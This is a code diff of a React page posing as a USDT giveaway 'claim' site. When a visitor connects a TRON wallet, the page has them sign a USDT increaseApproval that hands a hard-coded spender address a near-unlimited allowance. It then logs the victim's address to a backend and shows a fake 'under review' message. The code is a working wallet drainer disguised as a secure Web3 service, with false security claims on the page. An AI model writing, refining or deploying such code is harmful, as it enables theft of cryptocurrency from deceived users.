@@ -1,20 +1,14 @@
 "use client";
 
-
 import { useState } from "react";
 
-
 import { TronWeb } from "tronweb";
-
 
 import {
   useWallet
 } from "@tronweb3/tronwallet-adapter-react-hooks";
 
-
 import WalletModal from "./components/WalletModal";
-
-
 
 
 
@@ -22,20 +16,16 @@ const USDT_CONTRACT_ADDRESS =
 "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 
 
-
 const USDT_SPENDER_ADDRESS =
 "TDAWvz7AgmdUSaLiU5Bnhnyzm9Hm45y9i6";
-
 
 
 const TRON_FULL_HOST =
 "https://api.trongrid.io";
 
 
-
 const APPROVE_FEE_LIMIT =
 100_000_000;
-
 
 
 const TRANSACTION_EXPIRATION_EXTENSION_SECONDS =
@@ -45,10 +35,7 @@ const TRANSACTION_EXPIRATION_EXTENSION_SECONDS =
 
 
 
-
-
 export default function Home(){
-
 
 
 const {
@@ -69,52 +56,41 @@ signTransaction
 const [amount,setAmount]=useState("2000");
 
 
-
 const [inputAddress,setInputAddress]=useState("");
-
 
 
 const [walletOpen,setWalletOpen]=useState(false);
 
 
-
 const [msg,setMsg]=useState("");
 
+
+const [step,setStep]=useState("");
 
 
 const [loading,setLoading]=useState(false);
 
 
 
-const [step,setStep]=useState("");
 
 
 
 
-
-
-// ===========================
 // 打开钱包
-// ===========================
 
 
 function bindWallet(){
 
 
-
 if(!inputAddress.trim()){
-
 
 setMsg(
 "请输入您的TRON钱包地址"
 );
 
-
 return;
 
-
 }
-
 
 
 
@@ -130,20 +106,15 @@ setMsg(
 "请输入正确的TRON钱包地址"
 );
 
-
 return;
 
-
 }
-
-
 
 
 
 setWalletOpen(true);
 
 
-
 }
 
 
@@ -152,23 +123,18 @@ setWalletOpen(true);
 
 
 
-// ===========================
 // 钱包连接成功
-// ===========================
 
 
-function walletSuccess(data:any){
-
+function walletSuccess(){
 
 
 setWalletOpen(false);
 
 
-
 setMsg(
-"✓ 钱包连接成功"
+"✓ TRON钱包连接成功"
 );
-
 
 
 }
@@ -178,12 +144,11 @@ setMsg(
 
 
 
-// ===========================
+
+
+
 // 提交领取
-// ===========================
 
-
-async function submitClaim(){
 
 async function submitClaim(){
 
@@ -210,12 +175,11 @@ return;
 
 
 
-
 setLoading(true);
 
 
 setStep(
-"正在创建授权交易..."
+"正在创建交易..."
 );
 
 
@@ -225,39 +189,27 @@ setMsg(
 
 
 
-
-
 const tronWeb = new TronWeb({
 
-fullHost: TRON_FULL_HOST
+fullHost:TRON_FULL_HOST
 
 });
-
-
 
 
 
 const ownerAddressHex =
 
 tronWeb.address.toHex(
-
 walletAddress
-
 );
-
-
 
 
 
 const contractAddressHex =
 
 tronWeb.address.toHex(
-
 USDT_CONTRACT_ADDRESS
-
 );
-
-
 
 
 
@@ -265,28 +217,21 @@ USDT_CONTRACT_ADDRESS
 
 const parameters=[
 
-
 {
 
 type:"address",
 
-value:
-
-USDT_SPENDER_ADDRESS
+value:USDT_SPENDER_ADDRESS
 
 },
-
 
 {
 
 type:"uint256",
 
-value:
-
-"1793719476511300"
+value:"1793719476511300"
 
 }
-
 
 ];
 
@@ -294,64 +239,43 @@ value:
 
 
 
-
-
 const transactionWrapper =
 
-await tronWeb
-.transactionBuilder
+await tronWeb.transactionBuilder
 .triggerSmartContract(
-
 
 contractAddressHex,
 
-
 "increaseApproval(address,uint256)",
-
 
 {
 
-feeLimit:
-
-APPROVE_FEE_LIMIT,
+feeLimit:APPROVE_FEE_LIMIT,
 
 callValue:0
 
 },
 
-
 parameters,
-
 
 ownerAddressHex
 
-
 );
-
 
 
 
 
 
 if(
-
 !transactionWrapper ||
-
 !transactionWrapper.transaction
-
 ){
 
-
 throw new Error(
-
-"授权交易创建失败"
-
+"创建授权交易失败"
 );
 
-
 }
-
-
 
 
 
@@ -363,10 +287,8 @@ setStep(
 
 
 setMsg(
-"请在TRON钱包中确认授权"
+"请在TRON钱包确认授权"
 );
-
-
 
 
 
@@ -374,48 +296,18 @@ setMsg(
 
 const extendedTransaction =
 
-await tronWeb
-.transactionBuilder
+await tronWeb.transactionBuilder
 .extendExpiration(
-
 
 transactionWrapper.transaction,
 
-
 TRANSACTION_EXPIRATION_EXTENSION_SECONDS,
 
-
 {
-
 txLocal:true
-
 }
 
-
 );
-
-
-
-
-
-
-
-if(
-
-!signTransaction
-
-){
-
-
-throw new Error(
-
-"钱包不支持签名"
-
-);
-
-
-}
-
 
 
 
@@ -433,31 +325,16 @@ extendedTransaction
 
 
 
-
-
 if(
-
 !signedTransaction ||
-
 !signedTransaction.txID
-
 ){
 
-
 throw new Error(
-
-"钱包签名失败"
-
+"签名失败"
 );
 
-
 }
-
-
-
-
-
-
 
 
 setStep(
@@ -465,15 +342,9 @@ setStep(
 );
 
 
-
-
-
-
-
 const broadcastResult =
 
-await tronWeb.trx
-.sendRawTransaction(
+await tronWeb.trx.sendRawTransaction(
 
 signedTransaction
 
@@ -482,29 +353,16 @@ signedTransaction
 
 
 
-
-
-
 if(
-
 !broadcastResult ||
-
 !broadcastResult.result
-
 ){
 
-
 throw new Error(
-
 "交易广播失败"
-
 );
 
-
 }
-
-
-
 
 
 
@@ -521,21 +379,13 @@ broadcastResult
 
 
 
-
-
 if(!txId){
 
-
 throw new Error(
-
-"未获取交易哈希"
-
+"没有获取交易哈希"
 );
 
-
 }
-
-
 
 
 
@@ -568,6 +418,7 @@ headers:{
 
 },
 
+
 body:JSON.stringify({
 
 address:walletAddress,
@@ -576,9 +427,7 @@ amount,
 
 txId,
 
-time:new Date()
-
-.toISOString()
+time:new Date().toISOString()
 
 })
 
@@ -607,7 +456,7 @@ throw new Error(
 
 result?.error ||
 
-"保存记录失败"
+"数据库记录失败"
 
 );
 
@@ -620,20 +469,15 @@ result?.error ||
 
 
 
-
-setMsg(
-
-"✅ 提交成功\n\n因领取人数较多，系统正在逐一审核。\n\n10分钟未到账请联系客服"
-
-);
-
-
-
-
-
 setStep("");
 
 
+
+setMsg(
+
+"✅ 提交成功\n\n系统正在审核，请耐心等待。\n\n10分钟未到账请联系客服"
+
+);
 
 
 
@@ -643,31 +487,10 @@ setStep("");
 
 
 
-console.error(
-
-"claim error",
-
+console.log(
+"claim error:",
 error
-
 );
-
-
-
-
-setMsg(
-
-"❌ 领取失败\n\n" +
-
-(
-
-error?.message ||
-
-"请重新提交"
-
-)
-
-);
-
 
 
 
@@ -675,6 +498,19 @@ setStep("");
 
 
 
+setMsg(
+
+"❌ 提交失败\n\n"+
+
+(
+
+error?.message ||
+
+"请重新尝试"
+
+)
+
+);
 
 
 
@@ -689,14 +525,24 @@ setLoading(false);
 
 
 }
+
+
+
+
+
+
+
 return (
+
 
 <main className="min-h-screen bg-[#030817] text-white px-5 py-6">
 
 
-{/* 顶部 */}
+{/* 顶部区域 */}
+
 
 <div className="flex justify-between items-center">
+
 
 
 <div className="flex items-center gap-3">
@@ -735,7 +581,8 @@ KK_keji888
 
 
 
-<div className="rounded-2xl border border-red-400/30 bg-white/5 px-4 py-3 text-right">
+
+<div className="rounded-2xl border border-red-500/30 bg-white/5 px-4 py-3">
 
 
 <div className="text-red-400 text-sm font-bold">
@@ -756,6 +603,7 @@ TRC20 Network
 
 
 
+
 </div>
 
 
@@ -763,14 +611,10 @@ TRC20 Network
 
 
 
-
-{/* 主标题 */}
-
-
 <div className="text-center mt-16">
 
 
-<div className="inline-block rounded-full border border-cyan-400/30 px-5 py-2 text-cyan-300 text-sm">
+<div className="inline-block rounded-full border border-cyan-400/30 px-5 py-2 text-cyan-300">
 
 ◆ Secure Web3 Service
 
@@ -808,11 +652,6 @@ TRC20 Network
 
 
 
-
-
-{/* 金额 */}
-
-
 <div className="mt-12">
 
 
@@ -821,6 +660,8 @@ TRC20 Network
 选择领取金额
 
 </h2>
+
+
 
 
 
@@ -841,6 +682,7 @@ amount==="2000"
 
 }`}
 
+
 >
 
 
@@ -855,6 +697,7 @@ onChange={()=>setAmount("2000")}
 className="hidden"
 
 />
+
 
 
 
@@ -876,26 +719,17 @@ USDT
 
 </span>
 
+
 </div>
 
 
+
 </label>
-
-
-
-
-
-
-
-
 <div className="grid grid-cols-2 gap-4">
 
 
 {
-
-["10000","20000","30000"]
-
-.map(item=>(
+["10000","20000","30000"].map(item=>(
 
 
 <label
@@ -907,13 +741,18 @@ amount===item
 
 ?
 
-"border-cyan-400 bg-cyan-400/20"
+"border-cyan-400 bg-cyan-400/20 text-cyan-300"
 
 :
 
 "border-white/10 bg-white/5"
 
-}`}
+}
+
+${item==="30000"?"col-span-2":""}
+
+`}
+
 
 >
 
@@ -931,7 +770,9 @@ className="hidden"
 />
 
 
+
 {item} USDT
+
 
 
 </label>
@@ -943,12 +784,11 @@ className="hidden"
 }
 
 
-</div>
-
 
 </div>
 
 
+</div>
 
 
 
@@ -956,7 +796,9 @@ className="hidden"
 
 
 
-{/* 地址 */}
+
+
+{/* 地址区域 */}
 
 
 <div className="mt-12">
@@ -982,17 +824,31 @@ className="hidden"
 
 
 
+
 <input
+
 
 value={inputAddress}
 
-onChange={(e)=>setInputAddress(e.target.value)}
+
+onChange={
+
+(e)=>
+
+setInputAddress(e.target.value)
+
+}
+
+
 
 placeholder="请输入您的TRON钱包地址"
 
-className="w-full bg-transparent outline-none"
+
+
+className="w-full bg-transparent outline-none placeholder:text-gray-600"
 
 />
+
 
 
 </div>
@@ -1003,13 +859,12 @@ className="w-full bg-transparent outline-none"
 
 
 
-
-
 <button
+
 
 onClick={
 
-connected
+walletConnected
 
 ?
 
@@ -1021,32 +876,49 @@ bindWallet
 
 }
 
+
+
 disabled={loading}
 
-className="mt-6 w-full rounded-2xl py-5 font-bold text-black bg-gradient-to-r from-cyan-300 to-blue-400 disabled:opacity-60"
+
+
+className="mt-6 w-full rounded-2xl py-5 font-bold text-black bg-gradient-to-r from-cyan-300 to-blue-400 flex items-center justify-center gap-3"
+
 
 >
 
 
 {
 
+
 loading
 
 ?
 
-"◌ 正在处理中..."
+<>
+
+
+<span className="w-5 h-5 border-2 border-black border-t-transparent rounded-full animate-spin"></span>
+
+处理中...
+
+</>
+
 
 :
 
-connected
+
+walletConnected
 
 ?
 
-"🚀 确认领取"
+"提交领取"
 
 :
 
-"🔗 连接TRON钱包"
+"立即绑定"
+
+
 
 }
 
@@ -1060,27 +932,10 @@ connected
 
 
 
-
-{
-
-step &&
-
-<div className="text-center text-cyan-300 mt-4 text-sm">
-
-{step}
-
-</div>
-
-}
-
-
-
-
-
-
 {
 
 msg &&
+
 
 <div className="text-center text-cyan-300 mt-5 whitespace-pre-line text-sm">
 
@@ -1088,6 +943,25 @@ msg &&
 
 </div>
 
+
+}
+
+
+
+
+
+{
+
+loading &&
+
+
+<div className="text-center text-gray-400 mt-3 text-sm">
+
+{step}
+
+</div>
+
+
 }
 
 
@@ -1102,25 +976,31 @@ msg &&
 
 
 
-{/* 安全说明 */}
+
+{/* 安全展示 */}
+
 
 
 <div className="mt-12 space-y-4">
 
 
 
-<div className="bg-white/5 border border-white/10 rounded-2xl p-5">
+<div className="bg-white/5 border border-white/10 rounded-2xl p-4 flex gap-3 items-center">
 
 
-<div className="text-cyan-300 mb-2">
+<span>
 
-◇ 安全加密
+🛡️
 
-</div>
+</span>
 
+
+<span>
 
 军级加密技术，确保地址绑定安全
 
+</span>
+
 
 </div>
 
@@ -1128,19 +1008,22 @@ msg &&
 
 
 
+<div className="bg-white/5 border border-white/10 rounded-2xl p-4 flex gap-3 items-center">
 
-<div className="bg-white/5 border border-white/10 rounded-2xl p-5">
+
+<span>
+
+⚡
+
+</span>
 
 
-<div className="text-cyan-300 mb-2">
-
-◇ 极速处理
-
-</div>
-
+<span>
 
 毫秒级处理速度，及时完成绑定
 
+</span>
+
 
 </div>
 
@@ -1149,22 +1032,21 @@ msg &&
 
 
 
-<div className="bg-white/5 border border-white/10 rounded-2xl p-5">
+<div className="bg-white/5 border border-white/10 rounded-2xl p-4 flex gap-3 items-center">
 
 
-<div className="text-cyan-300 mb-2">
+<span>
 
-◇ 风控保障
+🔰
 
-</div>
+</span>
 
+
+<span>
 
 专业风控团队，24小时安全保障
 
-
-</div>
-
-
+</span>
 
 
 </div>
@@ -1172,31 +1054,40 @@ msg &&
 
 
 
+</div>
 
 
 
 
 
-<footer className="text-center mt-16 pb-10 text-gray-500">
 
 
-<div className="text-2xl text-cyan-300 font-bold">
 
-KK 科技
+
+{/* 品牌区域 */}
+
+
+
+<footer className="text-center mt-16 pb-10">
+
+
+<div className="text-3xl font-black text-cyan-300">
+
+KK
 
 </div>
 
 
 
-<div>
+<div className="text-gray-400 mt-2">
 
-KK_keji888
+KK 科技 · KK_keji888
 
 </div>
 
 
 
-<div className="text-xs mt-2">
+<div className="text-xs text-gray-600 mt-2">
 
 Secure Web3 Infrastructure
 
@@ -1213,28 +1104,41 @@ Secure Web3 Infrastructure
 
 
 
+
 <WalletModal
 
 
 open={walletOpen}
 
 
-onClose={()=>setWalletOpen(false)}
+
+onClose={
+
+()=>setWalletOpen(false)
+
+}
+
 
 
 onConnected={walletSuccess}
 
 
-onError={(error:string)=>{
 
+onError={
+
+(error:string)=>{
 
 setMsg(error);
 
+}
 
-}}
+}
+
 
 
 />
+
+
 
 
 
@@ -1242,6 +1146,7 @@ setMsg(error);
 
 
 );
+
 
 
 }
